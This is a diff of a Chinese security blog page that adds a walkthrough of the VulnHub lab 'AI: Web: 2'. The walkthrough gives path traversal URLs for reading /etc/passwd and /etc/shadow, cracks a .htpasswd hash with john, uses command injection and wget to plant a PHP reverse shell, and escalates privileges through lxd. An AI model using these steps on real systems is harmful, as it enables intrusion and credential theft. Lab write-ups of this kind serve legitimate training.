@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>九世的博客</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="九世的博客">
+  <title>vulnhub-web2 | 九世的博客</title>
+  <meta name="keywords" content=" 靶场 ">
+  <meta name="description" content="vulnhub-web2 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区">
 <meta property="og:type" content="website">
@@ -57,7 +57,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/img/avatar.jpg">
@@ -1116,12 +1116,49 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-vulnhub-web2" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Why-Blog"><span class="toc-text">Why Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#对博客的理解"><span class="toc-text">对博客的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于九世"><span class="toc-text">关于九世</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#博客平台"><span class="toc-text">博客平台</span></a></li></ol></li></ol>
+        <h1 class="article-title">vulnhub-web2</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color3">靶场</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title="更新时间: 2019-10-21 01:31:41">2019-10-20 21:04</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解题过程"><span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1134,32 +1171,195 @@
     }
 </style>
 </div>
-            <h1 id="Why-Blog"><a href="#Why-Blog" class="headerlink" title="Why Blog"></a>Why Blog</h1><h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p>喜欢写Blog的人，会经历三个阶段。</p>
-<blockquote>
-<p>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</p>
-</blockquote>
-<blockquote>
-<p>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</p>
-</blockquote>
-<blockquote>
-<p>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</p>
-</blockquote>
-<p>我们每个人的在网络上产生的数据越来越多，这些信息是我们在互联网上存在过的痕迹，值得我们认真对待。但是它们被分散分布在各个网站上。很多时候我们很难将它们聚合在一起，而且各个网站的信息排布方式也没有办法自由控制，所以我们需要一个可以由自己主宰的空间——博客。</p>
-<p>通过博客，我们可以记录自己的生活和成长的轨迹。它不像 Twitter 那样碎片化，也不像 Facebook 那样关系化，它是私人的空间。</p>
-<h2 id="关于九世"><a href="#关于九世" class="headerlink" title="关于九世"></a>关于九世</h2><p>这是<strong>九世</strong>的个人站。</p>
-<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
-<h2 id="博客平台"><a href="#博客平台" class="headerlink" title="博客平台"></a>博客平台</h2><p>这个博客通过 <a href="https://hexo.io/">Hexo</a> 生成，部署在 <a href="https://pages.github.com/">GitHub Pages</a>，主题 <a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a> 已经在github上开源</p>
-<p>主要功能：</p>
-<ul>
-<li>搜索支持文章标题、标签(#标签)、作者(@作者)</li>
-<li>pad/手机等移动端适配</li>
-<li>页面全局快捷键 <a href="http://yelog.org/2017/03/24/3-hexo-shortcuts/">3-hexo快捷键说明</a></li>
-</ul>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天去vulnhub捞了到题来做，感觉还行学到的东西挺多的。要考OSCP的gay佬们不访刷刷<br><img src="https://s2.ax1x.com/2019/10/20/KMrFcn.png" alt="KMrFcn.png"></p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>下载好虚拟机镜像，然后网络环境设置仅本机访问<br><img src="https://s2.ax1x.com/2019/10/20/KMsnqP.png" alt="KMsnqP.png"></p>
+<p>将kali设置为桥接模式，使用<code>fping -ag IP/24</code>获取存活的IP<br><img src="https://s2.ax1x.com/2019/10/20/KMcHy9.png" alt="KMcHy9.png"></p>
+<p>后面发现IP:192.168.1.109：</p>
+<pre><code>Kali:192.168.1.108
+Ubuntu:192.168.1.109
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/20/KMgFeI.png" alt="KMgFeI.png"></p>
+<p>先看web的几个页面和目录扫描一波<br><img src="https://s2.ax1x.com/2019/10/20/KMghnA.png" alt="KMghnA.png"></p>
+<p>发现一个注册和登录页面</p>
+<p>使用dirbsearch来扫描Bo目录</p>
+<pre><code>dirsearch -u http://192.168.1.109 -e path
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/20/KM2Fc4.png" alt="KM2Fc4.png"></p>
+<p>发现几个存活目录</p>
+<pre><code>[22:15:54] 301 -  233B  - /css  -&gt;  http://192.168.1.106/css/
+[22:15:56] 200 -  678B  - /index.php
+[22:15:56] 200 -  685B  - /index.php/login/
+[22:15:59] 403 -  199B  - /server-status
+[22:15:59] 403 -  199B  - /server-status/
+[22:16:01] 401 -  381B  - /webadmin/admin.html
+[22:16:01] 401 -  381B  - /webadmin/
+[22:16:01] 401 -  381B  - /webadmin
+[22:16:01] 401 -  381B  - /webadmin/index.html
+[22:16:01] 401 -  381B  - /webadmin/admin.php
+[22:16:01] 401 -  381B  - /webadmin/login.html
+[22:16:02] 401 -  381B  - /webadmin/index.php
+[22:16:02] 401 -  381B  - /webadmin/login.php
+</code></pre><p>发现可以访问的路径</p>
+<pre><code>http://192.168.1.109/signup.php
+http://192.168.1.109/
+</code></pre><p>还有设置了apache_auth的目录</p>
+<pre><code>/webadmin
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/20/KMRDJK.png" alt="KMRDJK.png"></p>
+<p>首先对注册的界面进行一波用户名猜解<br><img src="https://s2.ax1x.com/2019/10/20/KMWOje.png" alt="KMWOje.png"></p>
+<p>发现返回字节总数是：946的则为存在的用户</p>
+<pre><code>存在的用户
+admin
+00000000
+0
+111111
+11111111
+88888888
+888888
+aaaaaa
+aaaaaaaa
+</code></pre><p>在登录页面输入admin，可以进入管理界面<br><img src="https://s2.ax1x.com/2019/10/20/KMfq5q.png" alt=""></p>
+<p>发现这些功能都没的点，尝试用其他用户名登录，发现这些东西没法下载<br><img src="https://s2.ax1x.com/2019/10/20/KM5MCt.png" alt="KM5MCt.png"></p>
+<p>后面尝试从admin用户进去的管理的页面尝试获取新的思路，发现从源码中发现有一段被注释掉的文件上传的源码<br><img src="https://s2.ax1x.com/2019/10/20/KMIOw4.png" alt="KMIOw4.png"></p>
+<p>尝试文件上传</p>
+<pre><code class="html">&lt;html&gt;
+&lt;body&gt;
+        &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;/userpage.php&quot; method=&quot;POST&quot;&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000000000&quot; /&gt;
+            &lt;label for=&quot;uploadfile_input&quot;&gt;Choose a file to upload:&amp;nbsp;&amp;nbsp;&lt;/label&gt;&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; id=&quot;uploadfile_input&quot;/&gt;
+            &lt;button type=&quot;submit&quot; class = &quot;button&quot;&gt;Upload File&lt;/button&gt;
+            &lt;span class=&quot;error&quot;&gt;&lt;/span&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+  &lt;/html&gt;
+</code></pre>
+<p>发现文件上传并不成功<br><img src="https://s2.ax1x.com/2019/10/20/KM7dwF.png" alt="KM7dwF.png"></p>
+<p>端口扫描康康<br><img src="https://s2.ax1x.com/2019/10/20/KMHK6x.png" alt="KMHK6x.png"></p>
+<p>草…突然发现思路陷入死胡同，整理一波收集到的信息</p>
+<pre><code>IP
+http://192.168.1.106/
 
-        </article>
-        
-        
+用户名枚举
+http://192.168.1.106/signup.php
+
+目录
+[22:15:54] 301 -  233B  - /css  -&gt;  http://192.168.1.106/css/
+[22:15:56] 200 -  678B  - /index.php
+[22:15:56] 200 -  685B  - /index.php/login/
+[22:15:59] 403 -  199B  - /server-status
+[22:15:59] 403 -  199B  - /server-status/
+[22:16:01] 401 -  381B  - /webadmin/admin.html
+[22:16:01] 401 -  381B  - /webadmin/
+[22:16:01] 401 -  381B  - /webadmin
+[22:16:01] 401 -  381B  - /webadmin/index.html
+[22:16:01] 401 -  381B  - /webadmin/admin.php
+[22:16:01] 401 -  381B  - /webadmin/login.html
+[22:16:02] 401 -  381B  - /webadmin/index.php
+[22:16:02] 401 -  381B  - /webadmin/login.php
+
+存在的用户
+admin
+00000000
+0
+111111
+11111111
+88888888
+888888
+aaaaaa
+aaaaaaaa
+</code></pre><p>后面从其他用户，发现可以下载的地方注意到了那个链接</p>
+<pre><code>http://192.168.1.109/download.php?file_name= 下载的文件
+http://192.168.1.109/download.php?file_name=/../../../../../etc/passwd
+</code></pre><p>发现可以进行任意文件下载<br><img src="https://s2.ax1x.com/2019/10/20/KMLWjI.png" alt="KMLWjI.png"></p>
+<p>收集了一些目录对其进行burp跑</p>
+<pre><code>/etc/passwd
+/var/log/apache2/access.log
+/etc/shadow
+/etc/hosts
+/etc/apache2/apache2.conf
+/etc/apache2/ports.conf
+/etc/hostname
+/proc/version
+/etc/apache2/.htpasswd
+</code></pre><p>最后发现/.htpasswd有个hash<br><img src="https://s2.ax1x.com/2019/10/20/KMXX7V.png" alt=""></p>
+<p>使用john进行破解</p>
+<pre><code>john test.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre><p>这里使用rockyou.txt做字典的原因是，题目给出的提示<br><img src="https://s2.ax1x.com/2019/10/20/KQie41.png" alt=""></p>
+<p>最后的得到的密码<br><img src="https://s2.ax1x.com/2019/10/20/KQiluD.png" alt=""></p>
+<p>由于是.htpasswd在加上/etc/passwd上得到的用户，得出这是apache auth登录的用户</p>
+<pre><code>username:aiweb2admin
+passwd:c.ronaldo
+</code></pre><p>拥有密码后此时便可以访问到webadmin目录，进去之后给了个大大的提示<br><img src="https://s2.ax1x.com/2019/10/21/KQFXYn.png" alt="KQFXYn.png"></p>
+<p>访问/robots.txt<br><img src="https://s2.ax1x.com/2019/10/21/KQk1kd.png" alt="KQk1kd.png"></p>
+<p>访问第一个路径，得到一个ping功能的表单，这不是暗示这是个命令注入的洞吗- -！<br><img src="https://s2.ax1x.com/2019/10/21/KQk8fI.png" alt="KQk8fI.png"></p>
+<p>第二个路径提示更是是验证了上一个猜想<br><img src="https://s2.ax1x.com/2019/10/21/KQkRnU.png" alt="KQkRnU.png"></p>
+<p>首先先尝试能否ping通本机<br><img src="https://s2.ax1x.com/2019/10/21/KQk5N9.png" alt="KQk5N9.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/21/KQk71x.png" alt="KQk71x.png"></p>
+<p>PS:这里重启了虚拟机导致IP变了</p>
+<p>查看了一下权限<br><img src="https://s2.ax1x.com/2019/10/21/KQEEM6.png" alt="KQEEM6.png"></p>
+<p>当前目录<br><img src="https://s2.ax1x.com/2019/10/21/KQEnde.png" alt="KQEnde.png"></p>
+<p>尝试写shell，发现各种失败…由于apache的auth验证，导致菜刀无法使用，上传普通的一句话马子发现居然没有办法执行，迫不得已悄悄咪咪的看了一眼WP，发现居然使用一个名叫php-reverse-shell-1.0的玩意getshell</p>
+<p>下载地址：<br><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a></p>
+<p>在本机使用nc监听端口，然后修改那个php里面的IP和PORT设置<br><img src="https://s2.ax1x.com/2019/10/21/KQEJL8.png" alt="KQEJL8.png"></p>
+<p>但是我使用</p>
+<pre><code>x.php改名的
+wget http://192.168.1.108/x.php
+</code></pre><p>下载发现特么执行失败，后面我怀疑是代码没有完全传输完成，将马子改名为txt，下载到目标机后在改名为php</p>
+<pre><code>mv x.php x.txt
+wget http://192.168.1.108/x.txt
+mv x.txt x.php
+</code></pre><p><img src="ttps://s2.ax1x.com/2019/10/21/KQV1k4.png" alt=""></p>
+<p>后面访问上传的x.php最后得到一个低权的shell</p>
+<pre><code>http://192.168.1.108/webadmin/H05Tpin9555/x.php
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/21/KQVNX6.png" alt=""></p>
+<p>后面在/var/www/html发现一个特殊的目录<br><img src="https://s2.ax1x.com/2019/10/21/KQVWB8.png" alt=""></p>
+<p>进入发现一个txt<br><img src="https://s2.ax1x.com/2019/10/21/KQV5NQ.png" alt="KQV5NQ.png"></p>
+<p>给出 了一个低权的用户</p>
+<pre><code>User: n0nr00tuser
+Cred: zxowieoi4sdsadpEClDws1sf
+</code></pre><p>ssh连接之后，查询版本号和权限<br><img src="https://s2.ax1x.com/2019/10/21/KQVHcq.png" alt="KQVHcq.png"></p>
+<p>发现是Ubuntu 18.04….Google了一下Ubuntu 18.04提权的洞<br><a href="https://www.cnblogs.com/sch01ar/p/10453368.html" target="_blank" rel="noopener">Ubuntu 提权漏洞(CVE-2019-7304)复现 - Sch01aR# - 博客园</a> - 失败</p>
+<p><img src="https://s2.ax1x.com/2019/10/21/KQVxN4.png" alt=""></p>
+<p>searchsploit Ubuntu 18.04<br><img src="https://s2.ax1x.com/2019/10/21/KQZ7Ie.png" alt="KQZ7Ie.png"></p>
+<p>后面发现那个sh脚本完全不是这么利用的，，又悄悄咪咪的看了一下wp<br>发现是id命令执行之后又lxd这三个关键字的可以用这个来提权<br><img src="https://s2.ax1x.com/2019/10/21/KQeXY4.png" alt="KQeXY4.png"></p>
+<p>后面发现脚本的注释上有交怎么用这个jiaoben- -，下载之后，在用bash编译成一个tar.gz的玩意在把那个sh和压缩包拷贝在目标机然后</p>
+<pre><code>xxx.sh -f xx.tar.gz
+</code></pre><p>即可获得root权限……bash编译过程慢死了，还要fq<br><img src="https://s2.ax1x.com/2019/10/21/KQexp9.png" alt="KQexp9.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/21/KQezlR.png" alt="KQezlR.png"><br>后面根据题目提升在/mnt/root/root中找到flag.txt<br><img src="https://s2.ax1x.com/2019/10/21/KQmpOx.png" alt="KQmpOx.png"></p>
+<p>参考链接：<br><a href="https://www.hackingarticles.in/ai-web-2-vulnhub-walkthrough/" target="_blank" rel="noopener">AI: Web: 2 Vulnhub Walkthrough</a><br><a href="https://www.youtube.com/watch?v=V-z6FYk3-rw" target="_blank" rel="noopener">YouTube</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过看别的解题思路，发现作者在用admin登入后，将关键字XuezhuLi，在Google或searchsploit搜索了从而得到漏洞点..所以找到CMS或者服务名真的很重要<br><img src="https://s2.ax1x.com/2019/10/21/KQnnC4.png" alt="KQnnC4.png"></p>
+<p>到命令执行漏洞哪里，作者并没有立马执行命令，反而先用tcpdump -i &lt;网卡&gt; &lt;协议名&gt;，来判断是否和攻击机的IP想通</p>
+<p>getshell哪里也收到了一个不错的getshell玩意</p>
+<p>searchspolit搜到对应的exp时应该先看注释，不急得去使用exp</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>vulnhub-web2</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-10-20, 21:04:45</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-21, 01:31:41</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/86766a2f.html" title="vulnhub-web2">http://422926799.github.io/posts/86766a2f.html</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">©2016-2019 Yelog</p>
